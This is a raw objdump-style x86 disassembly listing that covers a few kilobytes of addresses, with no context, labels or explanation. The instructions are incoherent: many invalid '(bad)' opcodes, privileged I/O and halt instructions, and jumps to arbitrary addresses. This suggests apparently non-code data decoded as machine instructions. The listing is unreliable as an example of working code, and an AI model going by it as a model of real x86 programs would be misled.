  42e81b:	aad    0xbb
  42e81d:	(bad)  
  42e81f:	fucom  st(3)
  42e821:	fld    QWORD PTR [eax]
  42e823:	out    0x4,eax
  42e825:	aam    0xdf
  42e827:	clc    
  42e828:	fisttp WORD PTR [ebx]
  42e82a:	std    
  42e82b:	stc    
  42e82c:	out    dx,al
  42e82d:	int    0xe
  42e82f:	mov    esi,0xede4c3eb
  42e834:	hlt    
  42e835:	mov    dl,0xa8
  42e837:	int3   
  42e838:	jmp    0xd518952b
  42e83d:	lock aad 0xdb
  42e840:	iret   
  42e841:	push   es
  42e842:	fst    st(0)
  42e844:	(bad)  
  42e845:	loop   0x42e80a
  42e847:	out    0xe1,eax
  42e849:	(bad)  
  42e84a:	imul   ch
  42e84c:	add    cl,bl
  42e84e:	inc    edi
  42e850:	retf   
  42e851:	call   0xef07b819
  42e856:	mov    edx,0xcdcab1d2
  42e85b:	leave  
  42e85c:	jmp    0x42e837
  42e85e:	hlt    
  42e85f:	aam    0xd2
  42e861:	fcmovnu st,st(5)
  42e863:	hlt    
  42e864:	(bad)  
  42e865:	jmp    0xecf:0x9dce3df
  42e86c:	in     al,0xef
  42e86e:	enter  0xd2dd,0xf3
  42e872:	in     al,0xcf
  42e874:	shr    cl,0xe8
  42e877:	int3   
  42e878:	vpmaddwd ymm7,ymm7,ymm7
  42e87c:	call   0xf43ac239
  42e881:	fcmovu st,st(6)
  42e883:	xlat   BYTE PTR ds:[ebx]
  42e884:	(bad)  
  42e885:	neg    eax
  42e887:	add    dh,dh
  42e889:	lds    eax,FWORD PTR ds:0x50cc8ff
  42e88f:	stos   BYTE PTR es:[edi],al
  42e890:	(bad)  
  42e891:	fcomip st,st(1)
  42e893:	in     al,0xe0
  42e895:	cmc    
  42e896:	call   0xde16a394
  42e89b:	mov    ah,0xbb
  42e89d:	std    
  42e89e:	fsubr  st,st(6)
  42e8a0:	hlt    
  42e8a1:	in     eax,dx
  42e8a2:	hlt    
  42e8a3:	mov    esi,0xdf0007f0
  42e8a8:	add    ebp,esp
  42e8aa:	fnclex 
  42e8ac:	loopne 0x42e89d
  42e8ae:	in     al,dx
  42e8af:	shr    ecx,cl
  42e8b1:	loope  0x42e89c
  42e8b3:	mov    al,0xf2
  42e8b5:	mov    cl,0xdb
  42e8b7:	out    dx,al
  42e8b8:	retf   
  42e8b9:	shl    eax,cl
  42e8bb:	mov    edi,0xe1e2f8cd
  42e8c0:	enter  0xc3ed,0xf5
  42e8c4:	out    0xe3,al
  42e8c6:	mov    ebp,0xfdbce7f9
  42e8cc:	jmp    0x42e8b4
  42e8ce:	leave  
  42e8cf:	loope  0x42e87e
  42e8d1:	rcl    al,1
  42e8d3:	(bad)  
  42e8d5:	aad    0xd4
  42e8d7:	clc    
  42e8d8:	(bad)  
  42e8d9:	retf   0xebfb
  42e8dc:	fsubr  st,st(1)
  42e8de:	cld    
  42e8df:	add    ebp,ebp
  42e8e1:	pop    es
  42e8e2:	stc    
  42e8e3:	fcmovbe st,st(5)
  42e8e5:	add    eax,0xee80609
  42e8ea:	hlt    
  42e8eb:	retf   0xe008
  42e8ee:	or     dh,al
  42e8f0:	mov    esi,0xc2f7becc
  42e8f5:	ror    esi,1
  42e8f7:	leave  
  42e8f8:	mov    dh,0xed
  42e8fa:	fsubr  st,st(6)
  42e8fc:	(bad)  
  42e8fe:	push   edx
  42e900:	mov    eax,0xe3d1edd1
  42e905:	(bad)  
  42e906:	(bad)
  42e909:	or     bl,bl
  42e90b:	add    eax,DWORD PTR ds:0xbef0e30a
  42e911:	mov    ebp,0xc8ecb2e7
  42e916:	mov    ah,0xec
  42e918:	mov    ecx,0xcfbde6e7
  42e91d:	rcr    al,cl
  42e91f:	(bad)  
  42e920:	fucom  st(1)
  42e922:	cld    
  42e923:	push   es
  42e924:	sar    eax,0xd8
  42e927:	fsub   st,st(2)
  42e929:	add    esi,esi
  42e92b:	(bad)  
  42e92c:	out    dx,al
  42e92d:	repz fdivrp st(0),st
  42e930:	out    0xb2,eax
  42e932:	mov    dl,0xe8
  42e934:	(bad)  
  42e935:	jmp    0x42e906
  42e937:	retf   
  42e938:	(bad)  
  42e939:	fcmovu st,st(2)
  42e93b:	in     al,0xd6
  42e93d:	xlat   BYTE PTR ds:[ebx]
  42e93e:	iret   
  42e93f:	ror    ch,1
  42e941:	fsubrp st(1),st
  42e943:	mov    ebp,0xfbd2f6e1
  42e948:	(bad)  
  42e949:	std    
  42e94a:	push   es
  42e94b:	loopne 0x42e95c
  42e94d:	push   cs
  42e94e:	(bad)  
  42e94f:	out    dx,al
  42e950:	fdivr  QWORD PTR [edi+ecx*8-0x362b0d3a]
  42e957:	mov    ah,0xb9
  42e959:	sar    DWORD PTR [eax-0x42422d30],1
  42e95f:	enter  0xd9e7,0xfc
  42e963:	add    eax,0xfde1d8c4
  42e968:	idiv   ecx
  42e96a:	stc    
  42e96b:	add    al,0x9
  42e96d:	enter  0xd3f1,0xe9
  42e971:	(bad)  
  42e972:	cmc    
  42e973:	ror    ebp,0xe7
  42e976:	call   0x2dbb46
  42e97b:	mov    esi,0xf3d3c9f9
  42e980:	clc    
  42e981:	cli    
  42e982:	add    DWORD PTR [esi],eax
  42e984:	repz (bad) 
  42e987:	mov    edi,0xe1dfe1ea
  42e98c:	(bad)  
  42e98d:	enter  0xf0f8,0xe6
  42e991:	into   
  42e992:	aad    0xef
  42e994:	iret   
  42e995:	xlat   BYTE PTR ds:[ebx]
  42e996:	out    0xb1,al
  42e998:	sar    ecx,1
  42e99a:	(bad)  
  42e99c:	mov    edi,0xd6b7dfc3
  42e9a1:	loop   0x42e963
  42e9a3:	cli    
  42e9a4:	cmc    
  42e9a5:	jmp    edx
  42e9a7:	retf   
  42e9a8:	fadd   QWORD PTR [esi+eax*1]
  42e9ab:	ret    
  42e9ac:	out    dx,eax
  42e9ad:	repnz (bad) 
  42e9af:	jmp    0xf6f4:0xabcad7c4
  42e9b6:	cmc    
  42e9b7:	repz lock iret 
  42e9ba:	into   
  42e9bb:	repnz fnstcw WORD PTR [edx+0x3bcbed7]
  42e9c2:	loop   0x42e9ab
  42e9c4:	mov    esp,0x3dadbfc
  42e9c9:	pop    es
  42e9ca:	inc    esp
  42e9cc:	out    dx,al
  42e9cd:	or     cl,bh
  42e9cf:	mov    eax,0xf6cce3e2
  42e9d4:	int    0xb0
  42e9d6:	les    esi,FWORD PTR [ecx-0x293a4f3c]
  42e9dc:	fidiv  DWORD PTR [ebp-0x232437]
  42e9e2:	ret    
  42e9e3:	repnz add edi,ebp
  42e9e6:	repnz icebp 
  42e9e8:	or     BYTE PTR [edx+eax*1],al
  42e9eb:	or     BYTE PTR [ecx],cl
  42e9ed:	loopne 0x42e9b9
  42e9ef:	shl    cl,1
  42e9f1:	loope  0x42e99b
  42e9f3:	retf   0xf4cf
  42e9f6:	(bad)  
  42e9f7:	mov    dl,0xc0
  42e9f9:	not    ebx
  42e9fb:	iret   
  42e9fc:	fsubr  st,st(6)
  42e9fe:	mov    edi,0xf6cebdcf
  42ea03:	icebp  
  42ea04:	jmp    0x42e9fb
  42ea06:	fsubrp st(5),st
  42ea08:	imul   edi
  42ea0a:	(bad)  
  42ea0b:	fcmovnu st,st(1)
  42ea0d:	stc    
  42ea0e:	fcmove st,st(5)
  42ea10:	mov    bl,0xbc
  42ea12:	(bad)  
  42ea13:	fadd   st(6),st
  42ea15:	shl    esi,1
  42ea17:	rcr    eax,0xd5
  42ea1a:	shl    ecx,cl
  42ea1c:	iret   
  42ea1d:	dec    ebp
  42ea1f:	loop   0x42ea17
  42ea21:	int    0xf0
  42ea23:	out    0xb,eax
  42ea25:	out    0xf5,al
  42ea27:	ret    
  42ea28:	rol    edi,0xdf
  42ea2b:	(bad)  
  42ea2c:	out    0xcb,eax
  42ea2e:	jecxz  0x42e9fc
  42ea30:	jmp    0xab2bd013
  42ea35:	ror    dl,1
  42ea37:	sar    BYTE PTR [ebx-0x2723490f],1
  42ea3d:	jmp    0xc005:0xcddafcb9
  42ea44:	cmc    
  42ea45:	add    eax,0xdee7d507
  42ea4a:	into   
  42ea4b:	or     ecx,DWORD PTR [ecx]
  42ea4d:	add    eax,0xe2e8d103
  42ea52:	mov    dl,0xf3
  42ea54:	jmp    0xfae8:0xf9ebdac8
  42ea5b:	mov    ch,0xcc
  42ea5d:	(bad)  
  42ea5f:	(bad)  
  42ea61:	rcr    ah,1
  42ea63:	sar    ch,1
  42ea65:	sar    BYTE PTR [ecx+edi*8+0x606fce9],cl
  42ea6c:	push   es
  42ea6d:	psrlq  mm1,mm5
  42ea70:	test   esp,0xe2ecede3
  42ea76:	lods   al,BYTE PTR ds:[esi]
  42ea77:	in     eax,dx
  42ea78:	mov    ah,0xf8
  42ea7a:	mov    dh,0xee
  42ea7c:	lock aam 0xd0
  42ea7f:	loopne 0x42ea6d
  42ea81:	aad    0xc3
  42ea83:	mov    ebp,0xc2c4c405
  42ea88:	jmp    0xe9dc:0xe5d80dfc
  42ea8f:	jecxz  0x42ea73
  42ea91:	ror    ebp,cl
  42ea93:	shr    DWORD PTR [ecx+ebp*8-0x2c4f0d4f],1
  42ea9a:	aam    0xd4
  42ea9c:	mov    dh,0xd6
  42ea9e:	iret   
  42ea9f:	repz iret 
  42eaa1:	add    edx,esp
  42eaa3:	rcr    eax,cl
  42eaa5:	repnz add bl,ah
  42eaa8:	jmp    0x42ea7e
  42eaaa:	cmc    
  42eaab:	fadd   QWORD PTR [ecx]
  42eaad:	jmp    0xdcf7:0xc4c6c2cd
  42eab4:	call   0xb52cc588
  42eab9:	int    0xe5
  42eabb:	fcomip st,st(6)
  42eabd:	aad    0xca
  42eabf:	fcmovnbe st,st(3)
  42eac1:	cmc    
  42eac2:	in     al,dx
  42eac3:	stc    
  42eac4:	add    eax,0xfde8dee5
  42eac9:	fcomp  st(3)
  42eacb:	enter  0xff0b,0xd8
  42eacf:	fcomp  st(7)
  42ead1:	mov    edi,0xdbd7f1f3
  42ead6:	enter  0xf9d9,0xd2
  42eada:	shr    ch,cl
  42eadc:	retf   0xf6b8
  42eadf:	shl    dl,1
  42eae1:	ffreep st(6)
  42eae3:	aam    0xf9
  42eae5:	(bad)  
  42eae7:	(bad)  
  42eae8:	(bad)  
  42eaea:	(bad)  
  42eaeb:	jmp    0xcf27f0ba
  42eaf0:	fdivrp st(6),st
  42eaf2:	enter  0xd7e2,0xc3
  42eaf6:	mov    dl,0xec
  42eaf8:	out    0xf8,eax
  42eafa:	mov    bh,0xf3
  42eafc:	fstp   st(3)
  42eafe:	mov    edi,0xe7e1f8d7
  42eb03:	in     al,dx
  42eb04:	aam    0x4
  42eb06:	neg    ebx
  42eb08:	not    ebp
  42eb0a:	in     eax,0xdb
  42eb0c:	fcmovnu st,st(1)
  42eb0e:	push   cs
  42eb0f:	jecxz  0x42eb08
  42eb11:	scas   al,BYTE PTR es:[edi]
  42eb12:	icebp  
  42eb13:	jmp    0xd0faa6c4
  42eb18:	iret   
  42eb19:	ror    edi,1
  42eb1b:	enter  0xc8f5,0xf3
  42eb1f:	cli    
  42eb20:	(bad)  
  42eb21:	mov    ecx,0xdac507db
  42eb26:	loop   0x42eaed
  42eb28:	cld    
  42eb29:	(bad)  
  42eb2a:	or     eax,0xd3e513cf
  42eb2f:	leave  
  42eb30:	(bad)  
  42eb32:	rol    bl,1
  42eb34:	int3   
  42eb35:	ret    
  42eb36:	loopne 0x42eb28
  42eb38:	mov    ch,0xfb
  42eb3a:	out    dx,al
  42eb3b:	aad    0xf2
  42eb3d:	sti    
  42eb3e:	xlat   BYTE PTR ds:[ebx]
  42eb3f:	hlt    
  42eb40:	rol    DWORD PTR [edi],1
  42eb42:	mov    esp,0xbf6d8f2
  42eb47:	fxch   st(2)
  42eb49:	add    al,0x3
  42eb4b:	std    
  42eb4c:	inc    esp
  42eb4e:	in     eax,0xcb
  42eb50:	repnz (bad) 
  42eb53:	hlt    
  42eb54:	aam    0xf0
  42eb56:	mov    dh,0xf7
  42eb58:	(bad)
  42eb5b:	mov    esi,0xd2f7ded3
  42eb60:	mov    esp,0xf7ccd9e6
  42eb65:	hlt    
  42eb66:	in     eax,0xd4
  42eb68:	jecxz  0x42eb4a
  42eb6a:	clc    
  42eb6b:	out    0x13,al
  42eb6d:	int3   
  42eb6e:	add    ebp,ecx
  42eb70:	mov    al,0xcd
  42eb72:	shr    BYTE PTR [ebx-0x251a0d10],0xf5
  42eb79:	out    0xd4,al
  42eb7b:	mov    esi,0xbdf4bfbd
  42eb80:	mov    ecx,0xd6d7cdc2
  42eb85:	cli    
  42eb86:	ret    0xc5d0
  42eb89:	call   0xc08c959
  42eb8e:	or     ch,BYTE PTR [ebx-0x3e124340]
  42eb94:	retf   0xb5e3
  42eb97:	mov    bh,0xc5
  42eb99:	hlt    
  42eb9a:	in     al,dx
  42eb9b:	sar    DWORD PTR [ebp-0x2bfd2e0c],cl
  42eba1:	(bad)  
  42eba3:	add    DWORD PTR [ecx+edi*8],eax
  42eba6:	retf   
  42eba7:	or     BYTE PTR [ebx],al
  42eba9:	(bad)  
  42ebab:	fadd   st(2),st
  42ebad:	in     eax,0xfc
  42ebaf:	in     al,0xae
  42ebb1:	mov    esp,0xb7b7f4f7
  42ebb6:	mov    edx,0xbbe7e9ef
  42ebbb:	retf   0xbeeb
  42ebbe:	fdivr  st,st(0)
  42ebc0:	shl    ecx,cl
  42ebc2:	mov    cl,0xc1
  42ebc5:	(bad)  
  42ebc6:	retf   0x9d1
  42ebc9:	pop    es
  42ebca:	in     eax,dx
  42ebcb:	add    eax,0xe2e2ea09
  42ebd0:	(bad)  
  42ebd2:	call   0xa92ad5c1
  42ebd7:	mul    al
  42ebd9:	shr    ecx,cl
  42ebdb:	mov    ecx,0xc1f2eaf3
  42ebe0:	mov    ecx,0xbf2cccd
  42ebe5:	mov    esp,0xaefff05
  42ebea:	add    al,0xe5
  42ebec:	out    dx,al
  42ebed:	(bad)  
  42ebee:	in     al,dx
  42ebef:	mov    edi,0xe9cbc1be
  42ebf4:	in     al,0xb6
  42ebf6:	lds    esi,FWORD PTR [ebx-0x2c400d]
  42ebfc:	call   eax
  42ebfe:	aad    0xbd
  42ec00:	rcl    ebx,0xd1
  42ec03:	add    al,0xe6
  42ec05:	add    edi,esi
  42ec07:	retf   0xfefc
  42ec0a:	hlt    
  42ec0b:	push   cs
  42ec0c:	push   es
  42ec0d:	add    eax,0xc3b8e104
  42ec12:	mov    esi,0xe7c1f4f1
  42ec17:	repnz (bad) 
  42ec19:	call   0xe92bd8f2
  42ec1e:	jmp    0xe4d5:0xbfdff8
  42ec25:	repz loopne 0x42ec10
  42ec28:	jmp    0xf80d:0xfa0ced0e
  42ec2f:	(bad)
  42ec32:	int3   
  42ec33:	div    BYTE PTR [esi-0xe173f2d]
  42ec39:	in     al,0xc5
  42ec3b:	mov    eax,0xf5f9d0d0
  42ec40:	add    edi,esp
  42ec42:	lock int3 
  42ec44:	jmp    0x42ec17
  42ec46:	loope  0x42ec20
  42ec48:	lar    edi,cx
  42ec4b:	cmc    
  42ec4c:	fsubr  st(2),st
  42ec4e:	retf   0xb1c0
  42ec51:	into   
  42ec52:	sar    DWORD PTR [edi+eax*8-0x24460f1e],0xea
  42ec5a:	lods   al,BYTE PTR ds:[esi]
  42ec5b:	std    
  42ec5c:	mov    edx,0xc1c1e9d5
  42ec61:	out    dx,eax
  42ec62:	add    DWORD PTR [esi+edi*8+0x2c7f8f0],edi
  42ec69:	retf   0xe8c5
  42ec6c:	loope  0x42ec39
  42ec6e:	adc    esi,DWORD PTR [edx-0x19102f16]
  42ec74:	lock shl cl,0xbb
  42ec78:	(bad)  
  42ec79:	cli    
  42ec7a:	retf   0xb2de
  42ec7d:	shl    al,1
  42ec7f:	mov    ecx,0xdfd506fa
  42ec84:	repnz inc al
  42ec87:	loope  0x42ec94
  42ec89:	(bad)  
  42ec8b:	jecxz  0x42ec93
  42ec8d:	iret   
  42ec8e:	jecxz  0x42ec73
  42ec90:	fdivr  DWORD PTR [esi-0x3b2d0c3a]
  42ec96:	test   al,0xd4
  42ec98:	out    0xc4,eax
  42ec9a:	(bad)  
  42ec9c:	neg    ebp
  42ec9e:	fdivp  st(3),st
  42eca0:	out    dx,eax
  42eca1:	xlat   BYTE PTR ds:[ebx]
  42eca2:	out    0xf9,eax
  42eca4:	mov    ebp,0xc1f602c3
  42eca9:	or     dl,ch
  42ecab:	jmp    0xf1cf:0xc9d8cbed
  42ecb2:	in     al,dx
  42ecb3:	in     eax,0xf4
  42ecb5:	mul    bh
  42ecb7:	into   
  42ecb8:	int3   
  42ecb9:	aad    0xfa
  42ecbb:	fcmovbe st,st(3)
  42ecbd:	hlt    
  42ecbe:	call   0xfb46ba9d
  42ecc3:	mov    edi,0x6f6ff02
  42ecc8:	xadd   eax,eax
  42eccb:	push   es
  42eccc:	add    ebx,ebx
  42ecce:	fbstp  TBYTE PTR [ebx-0x2d182957]
  42ecd4:	enter  0xcbb5,0xf3
  42ecd8:	cmc    
  42ecd9:	fucomi st,st(1)
  42ecdb:	repz cli 
  42ecdd:	fcmovnu st,st(5)
  42ecdf:	cmc    
  42ece0:	fadd   st(1),st
  42ece2:	sar    BYTE PTR [ecx+edi*8-0x3f1a0f16],cl
  42ece9:	jmp    0xed3cd0b5
  42ecee:	int3   
  42ecef:	fld    st(2)
  42ecf1:	out    0xe6,eax
  42ecf3:	shr    bl,1
  42ecf5:	loope  0x42ece2
  42ecf7:	mov    dh,0xf0
  42ecf9:	in     eax,0xf1
  42ecfb:	(bad)  
  42ecfd:	out    dx,al
  42ecfe:	mov    ah,0xb9
  42ed00:	fucomi st,st(4)
  42ed02:	icebp  
  42ed03:	push   es
  42ed04:	hlt    
  42ed05:	repnz (bad) 
  42ed07:	in     eax,0xd8
  42ed09:	loope  0x42ed0c
  42ed0b:	hlt    
  42ed0c:	int    0xc1
  42ed0e:	loope  0x42ecbb
  42ed10:	loopne 0x42ecdd
  42ed12:	mov    dl,0xc8
  42ed14:	mov    ch,0xe3
  42ed16:	iret   
  42ed17:	mov    ch,0xb4
  42ed19:	mov    ecx,0xe2b5ecd2
  42ed1e:	shl    esi,cl
  42ed20:	mov    edi,0xbcf7ccde
  42ed25:	out    0xf5,al
  42ed27:	(bad)  
  42ed28:	(bad)  
  42ed29:	add    eax,0xcedad9fd
  42ed2e:	pop    es
  42ed2f:	call   0xe106cd1f
  42ed34:	out    dx,al
  42ed35:	cmc    
  42ed36:	jmp    0xc4f3a227
  42ed3b:	(bad)  
  42ed3e:	cli    
  42ed3f:	in     al,dx
  42ed40:	mov    esp,0xd9d6d6d4
  42ed45:	shl    esp,0xf4
  42ed48:	jmp    0xda4eed2e
  42ed4d:	retf   
  42ed4e:	fldlg2 
  42ed50:	jmp    0xfac5:0xe4b2e7e1
  42ed57:	scas   eax,DWORD PTR es:[edi]
  42ed58:	call   0xef1bc14f
  42ed5d:	out    dx,eax
  42ed5e:	aam    0xc9
  42ed60:	mov    esp,0xd407b8ee
  42ed65:	ret    
  42ed66:	cmc    
  42ed67:	fdivp  st(6),st
  42ed69:	std    
  42ed6a:	iret   
  42ed6b:	or     esi,ebx
  42ed6d:	jmp    0xcae6:0xe9c7e5dc
  42ed74:	ret    
  42ed75:	retf   
  42ed76:	lods   al,BYTE PTR ds:[esi]
  42ed77:	cmc    
  42ed78:	mov    al,0xe8
  42ed7a:	mov    ecx,0x2bcbef3
  42ed7f:	(bad)  
  42ed81:	out    0xdb,al
  42ed83:	(bad)  
  42ed84:	mov    esp,0x6bfdfde
  42ed89:	dec    dh
  42ed8b:	std    
  42ed8c:	(bad)  
  42ed8d:	in     eax,dx
  42ed8e:	adc    ecx,ebx
  42ed90:	loope  0x42ed71
  42ed92:	mov    bl,0xe6
  42ed94:	imul   esp
  42ed96:	int    0xed
  42ed98:	shl    dh,0xdd
  42ed9b:	mov    bh,0xd9
  42ed9d:	jmp    0x42ed53
  42ed9f:	loopne 0x42ed60
  42eda1:	out    dx,al
  42eda2:	out    0xf8,al
  42eda4:	(bad)
  42eda8:	stc    
  42eda9:	(bad)  
  42edaa:	(bad)  
  42edab:	dec    ebx
  42edad:	int    0xd9
  42edaf:	mov    edi,0xc5c4d6df
  42edb4:	int3   
  42edb5:	aad    0xbb
  42edb7:	ror    esp,0xcc
  42edba:	out    dx,al
  42edbb:	sar    ebp,1
  42edbd:	aad    0xd2
  42edbf:	leave  
  42edc0:	loopne 0x42edc9
  42edc2:	mov    ah,0x6
  42edc4:	ret    
  42edc5:	push   es
  42edc6:	xlat   BYTE PTR ds:[ebx]
  42edc7:	fucomp st(0)
  42edc9:	jecxz  0x42edb3
  42edcb:	stc    
  42edcc:	(bad)  
  42edce:	adc    edx,ebp
  42edd0:	in     eax,dx
  42edd1:	(bad)  
  42edd2:	aad    0xf0
  42edd4:	mov    al,0xc3
  42edd6:	int3   
  42edd7:	int3   
  42edd8:	lock clc 
  42edda:	mov    eax,0xfeedc9ef
  42eddf:	push   ebx
  42ede1:	ret    
  42ede2:	rcl    esi,cl
  42ede4:	aad    0xf6
  42ede6:	loopne 0x42edb3
  42ede8:	fcomi  st,st(5)
  42edea:	loopne 0x42edcb
  42edec:	add    al,BYTE PTR [edx]
  42edee:	leave  
  42edef:	int3   
  42edf0:	mov    cl,0xd0
  42edf2:	mov    al,0xbc
  42edf4:	mov    esp,0xc0b1e9ca
  42edf9:	mov    edi,0xd4d5beb9
  42edfe:	loope  0x42edbd
  42ee00:	lock (bad) 
  42ee02:	loopne 0x42edc2
  42ee04:	mov    ebp,0xe7e5d0e7
  42ee09:	(bad)  
  42ee0b:	enter  0xe5ee,0x7
  42ee0f:	call   0xb7f29ef9
  42ee14:	test   edx,0xc6e6d7e2
  42ee1a:	hlt    
  42ee1b:	retf   0xf5d0
  42ee1e:	ret    
  42ee1f:	cld    
  42ee20:	add    DWORD PTR [eax-0xe3e0b10],edi
  42ee26:	out    0x7,eax
  42ee28:	add    dh,dh
  42ee2a:	leave  
  42ee2b:	add    eax,0xf3e2c900
  42ee30:	(bad)  
  42ee31:	out    dx,al
  42ee32:	repnz retf 0xe0dc
  42ee36:	mov    bh,0xf6
  42ee38:	aad    0xd7
  42ee3a:	(bad)  
  42ee3b:	repnz rcl cl,cl
  42ee3e:	call   0xce34bd37
  42ee43:	fdiv   st,st(4)
  42ee45:	cmc    
  42ee46:	fucom  st(6)
  42ee48:	loop   0x42ee24
  42ee4a:	fcomi  st,st(5)
  42ee4c:	enter  0xf9df,0xe9
  42ee50:	out    0xe8,al
  42ee52:	lods   al,BYTE PTR ds:[esi]
  42ee53:	int    0xcd
  42ee55:	int    0xe1
  42ee57:	loope  0x42ee33
  42ee59:	(bad)  
  42ee5b:	ror    ecx,1
  42ee5d:	mov    ah,0xf6
  42ee5f:	jmp    0xdf1bf537
  42ee64:	repnz mov ebp,0xdfe703f0
  42ee6a:	loop   0x42ee75
  42ee6c:	lds    eax,FWORD PTR [ebx]
  42ee6e:	shl    cl,cl
  42ee70:	loope  0x42ee35
  42ee72:	cmc    
  42ee73:	loop   0x42ee51
  42ee75:	(bad)  
  42ee76:	(bad)  
  42ee77:	mov    ecx,0xcbbeb9ba
  42ee7c:	retf   0xf1db
  42ee7f:	(bad)  
  42ee80:	loopne 0x42ee6e
  42ee82:	(bad)  
  42ee84:	rcl    cl,1
  42ee86:	jmp    0xf3fe:0xdcff09f9
  42ee8d:	fcmovne st,st(2)
  42ee8f:	lds    esi,FWORD PTR [ebx-0x334e4857]
  42ee95:	out    0xf4,al
  42ee97:	mov    bh,0xf2
  42ee99:	fcomp  st(0)
  42ee9b:	jmp    0x701:0xdfdbf6fd
  42eea2:	in     eax,0xdd
  42eea4:	aam    0xf5
  42eea6:	(bad)  
  42eea7:	mov    edi,0x50de4dd
  42eeac:	iret   
  42eead:	(bad)  
  42eeae:	jmp    esi
  42eeb0:	vpmulhw xmm7,xmm7,XMMWORD PTR [ebp-0x14062934]
  42eeb8:	(bad)  
  42eeb9:	jmp    0x42ee6b
  42eebb:	vpmaxsw xmm7,xmm6,XMMWORD PTR [ebp-0x1f243e0d]
  42eec3:	mov    ebx,0x10abdfe
  42eec8:	in     eax,0x1
  42eeca:	stc    
  42eecb:	(bad)  
  42eecc:	in     eax,dx
  42eecd:	int3   
  42eece:	pop    gs
  42eed0:	jecxz  0x42eebd
  42eed2:	mov    bl,0xcc
  42eed4:	hlt    
  42eed5:	retf   
  42eed6:	in     eax,0xb0
  42eed8:	vshufpd ymm6,ymm2,ymm6,0xd5
  42eedd:	jecxz  0x42ee9d
  42eedf:	mov    ebp,0xfdd4de
  42eee4:	(bad)
  42eee7:	loopne 0x42eee2
  42eee9:	push   cs
  42eeea:	(bad)  
  42eeeb:	inc    ah
  42eeed:	ffree  st(0)
  42eeef:	in     eax,0xec
  42eef1:	ret    0xaec8
  42eef4:	in     eax,dx
  42eef5:	sar    ebx,1
  42eef7:	out    dx,eax
  42eef8:	hlt    
  42eef9:	sti    
  42eefa:	(bad)
  42eefd:	(bad)  
  42eefe:	cli    
  42eeff:	sar    ebx,0x0
  42ef02:	icebp  
  42ef03:	stc    
  42ef04:	(bad)  
  42ef05:	fcmovnb st,st(5)
  42ef07:	(bad)  
  42ef09:	mov    ebp,0xee13c801
  42ef0e:	or     esi,ecx
  42ef10:	shr    DWORD PTR [edi-0x3b511d0b],1
  42ef16:	aad    0xd6
  42ef18:	(bad)
  42ef1b:	mov    edi,0xb7dfebff
  42ef20:	mov    eax,0xfff3b8df
  42ef25:	ret    
  42ef26:	lock ret 0xe303
  42ef2a:	loopne 0x42ef30
  42ef2c:	out    dx,eax
  42ef2d:	loop   0x42ef2e
  42ef2f:	int    0xdd
  42ef31:	repz jecxz 0x42ef16
  42ef34:	shl    ebx,0xb2
  42ef37:	loopne 0x42eeef
  42ef39:	out    dx,al
  42ef3a:	fnstenv [edi-0x17131606]
  42ef40:	int    0x2
  42ef42:	into   
  42ef43:	hlt    
  42ef44:	fisttp DWORD PTR [edx]
  42ef46:	add    esi,esp
  42ef48:	mov    esi,0xcee3e0fa
  42ef4d:	add    eax,0xecc5aa12
  42ef52:	scas   eax,DWORD PTR es:[edi]
  42ef53:	shr    cl,0xcf
  42ef56:	repnz mov dl,0xcb
  42ef59:	sar    DWORD PTR [eax-0x31372145],1
  42ef5f:	(bad)  
  42ef60:	in     al,dx
  42ef61:	fsubr  st(6),st
  42ef63:	ffree  st(2)
  42ef65:	add    bh,ch
  42ef67:	add    al,0xe0
  42ef69:	aam    0xd6
  42ef6b:	fisttp QWORD PTR [edi]
  42ef6d:	or     al,0xe9
  42ef6f:	rcr    eax,0xae
  42ef72:	test   al,0xb2
  42ef74:	(bad)  
  42ef75:	out    0xd5,al
  42ef77:	clc    
  42ef78:	(bad)  
  42ef79:	(bad)  
  42ef7a:	hlt    
  42ef7b:	mov    ebx,0xe2f4bffe
  42ef80:	inc    BYTE PTR [ecx]
  42ef82:	in     eax,dx
  42ef83:	stc    
  42ef84:	sti    
  42ef85:	repz add cl,ah
  42ef88:	cld    
  42ef89:	test   dh,0xe5
  42ef8c:	fiadd  WORD PTR [edi]
  42ef8e:	out    dx,al
  42ef8f:	test   eax,0xe8dec3be
  42ef94:	loop   0x42ef59
  42ef96:	mov    ch,0xc4
  42ef98:	cmc    
  42ef99:	iret   
  42ef9a:	iret   
  42ef9b:	cmc    
  42ef9c:	jmp    0xe424ee91
  42efa1:	push   es
  42efa2:	mov    eax,0xe70bd3d6
  42efa7:	sar    edx,1
  42efa9:	(bad)
  42efac:	pop    es
  42efad:	loope  0x42ef94
  42efaf:	ret    0xd0f2
  42efb2:	out    0xc4,al
  42efb4:	into   
  42efb5:	rol    cl,0xc9
  42efb8:	mov    ecx,0xcdccfbb5
  42efbd:	jmp    0xf40be097
  42efc2:	(bad)  
  42efc3:	idiv   DWORD PTR [edx+edi*8-0x16f8021a]
  42efca:	jmp    0x42ef95
  42efcc:	or     al,0xcc
  42efce:	add    ebp,esp
  42efd0:	repz loop 0x42efa5
  42efd3:	scas   eax,DWORD PTR es:[edi]
  42efd4:	aam    0xc4
  42efd6:	(bad)  
  42efd7:	xlat   BYTE PTR ds:[ebx]
  42efd8:	fucomi st,st(6)
  42efda:	(bad)  
  42efdc:	mov    eax,0xf3efe8da
  42efe1:	mov    ebp,0xf6c2f803
  42efe6:	in     al,0xd1
  42efe8:	sar    dl,0xce
  42efeb:	cmc    
  42efec:	out    dx,al
  42efed:	or     eax,0xe7c2b2f8
  42eff2:	(bad)
  42eff6:	in     eax,0xc6
  42eff8:	imul   ebx
  42effa:	retf   0xd5f4
  42effd:	mov    ah,0xd0
  42efff:	fndisi(8087 only) 
  42f001:	sar    BYTE PTR [ebp-0x3e2c130c],0xc3
  42f008:	(bad)  
  42f009:	call   0xdc24bbfb
  42f00e:	out    dx,eax
  42f00f:	out    0xaa,al
  42f011:	jecxz  0x42efda
  42f013:	test   al,0xa9
  42f016:	xlat   BYTE PTR ds:[ebx]
  42f017:	call   0xf117bff5
  42f01c:	rol    DWORD PTR [edx],cl
  42f01e:	int    0xfb
  42f020:	cli    
  42f021:	mov    esp,0x50307e7
  42f026:	jmp    0x627d332
  42f02b:	in     al,0xfd
  42f02d:	repz fbstp TBYTE PTR [ecx-0x39361a0e]
  42f034:	mov    al,0xf2
  42f036:	fcmovb st,st(1)
  42f038:	mov    ch,0xc6
  42f03a:	icebp  
  42f03b:	xlat   BYTE PTR ds:[ebx]
  42f03c:	(bad)  
  42f03d:	repz in eax,dx
  42f03f:	fcmovu st,st(2)
  42f041:	mov    ecx,0xd7f5c6ff
  42f046:	ftst   
  42f048:	not    bh
  42f04a:	loopne 0x42f016
  42f04c:	loope  0x42f01d
